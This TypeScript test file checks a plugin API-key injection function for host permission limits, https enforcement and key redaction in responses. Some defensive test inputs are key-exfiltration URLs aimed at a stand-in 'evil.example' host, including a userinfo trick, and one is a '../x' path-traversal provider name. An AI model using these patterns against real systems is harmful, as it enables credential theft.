import { describe, expect, it } from 'vitest';
import { providerFetch, type ProviderFetchDeps } from './provider-fetch';

const KEY = 'sk-secret-123';

function rig(permissions: string[] | null = ['network:api.pictures.example']): { deps: ProviderFetchDeps; sent: { url: string; init: RequestInit }[] } {
  const sent: { url: string; init: RequestInit }[] = [];
  return {
    sent,
    deps: {
      key: async (id) => (id === 'pics' ? KEY : null),
      permissions: async () => permissions,
      fetch: (async (url: string | URL, init?: RequestInit) => {
        sent.push({ url: String(url), init: init ?? {} });
        return new Response(new Uint8Array([1, 2, 3]), { status: 200 });
      }) as unknown as typeof fetch,
    },
  };
}

const ask = (over: Partial<Parameters<typeof providerFetch>[1]> = {}): Parameters<typeof providerFetch>[1] => ({
  provider: 'pics',
  plugin: 'pictures',
  url: 'https://api.pictures.example/v1/make',
  method: 'POST',
  headers: { Authorization: 'Bearer {{key}}' },
  body: '{"prompt":"a wall"}',
  ...over,
});

describe('a picture provider asks for its own key without holding it', () => {
  it('has the key put in by the main process, and gets the answer back', async () => {
    const { deps, sent } = rig();
    const r = await providerFetch(deps, ask());
    expect(r.status).toBe(200);
    expect([...r.body]).toEqual([1, 2, 3]);
    expect((sent[0]!.init.headers as Record<string, string>).Authorization).toBe(`Bearer ${KEY}`);
  });

  it('also puts it in the address and the body when asked there', async () => {
    const { deps, sent } = rig();
    await providerFetch(deps, ask({ url: 'https://api.pictures.example/v1/make?key={{key}}', body: '{"k":"{{key}}"}' }));
    expect(sent[0]!.url).toBe(`https://api.pictures.example/v1/make?key=${KEY}`);
    expect(sent[0]!.init.body).toBe(`{"k":"${KEY}"}`);
  });

  it('never lets the key into the part of the address that says where the request goes', async () => {
    const { deps, sent } = rig(['network']);
    await expect(providerFetch(deps, ask({ url: 'https://{{key}}.evil.example/x' }))).rejects.toThrow(/where it goes/);
    await expect(providerFetch(deps, ask({ url: 'https://api.pictures.example@{{key}}.evil.example/x' }))).rejects.toThrow();
    expect(sent).toEqual([]);
  });

  it('refuses a plugin that was not given the network, or not that host', async () => {
    await expect(providerFetch(rig([]).deps, ask())).rejects.toThrow(/network/);
    await expect(providerFetch(rig(['network:other.example']).deps, ask())).rejects.toThrow(/api\.pictures\.example/);
    await expect(providerFetch(rig(null).deps, ask())).rejects.toThrow(/installed/);
    expect((await providerFetch(rig(['network']).deps, ask())).status).toBe(200);
  });

  it('refuses a plain http address (except this computer), a provider with no key, and odd names', async () => {
    const { deps } = rig(['network']);
    await expect(providerFetch(deps, ask({ url: 'http://api.pictures.example/x' }))).rejects.toThrow(/https/);
    await expect(providerFetch(deps, ask({ provider: 'nokey' }))).rejects.toThrow(/no key/);
    await expect(providerFetch(deps, ask({ provider: '../x' }))).rejects.toThrow(/provider/);
  });

  it('blanks the key out of anything the answer says back', async () => {
    const { deps } = rig(['network']);
    deps.fetch = (async () => new Response(`you sent ${KEY}`, { status: 401 })) as unknown as typeof fetch;
    const r = await providerFetch(deps, ask());
    expect(new TextDecoder().decode(r.body)).toBe('you sent ***');
  });
});
